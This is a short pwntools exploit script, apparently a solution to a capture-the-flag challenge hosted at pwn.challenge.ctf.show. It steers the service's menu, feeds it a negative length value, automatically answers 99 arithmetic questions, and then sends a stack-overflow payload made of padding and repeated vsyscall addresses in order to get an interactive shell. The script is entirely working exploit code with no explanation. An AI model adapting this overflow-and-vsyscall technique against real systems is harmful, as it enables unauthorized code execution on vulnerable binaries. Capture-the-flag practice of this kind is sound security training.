from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28161)
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
vsyscall_add = 0xffffffffff600000
io.sendlineafter("Choice:\n",'2')
io.sendlineafter("Choice:\n",'1')
io.sendlineafter("doubts?\n",'0')
io.sendlineafter("more?\n",'-378')
for i in range(99):
    io.recvuntil("Question: ")
    answer1 = int(io.recvuntil(" ")[:-1])
    io.recvuntil("* ")
    answer2 = int(io.recvuntil(" ")[:-1])
    io.sendlineafter("Answer:",str(answer1*answer2))
    
payload = 'A' * 0x30
payload += 'B'* 0x8
payload += p64(vsyscall_add) * 3
io.sendafter("Answer:",payload)
io.interactive()
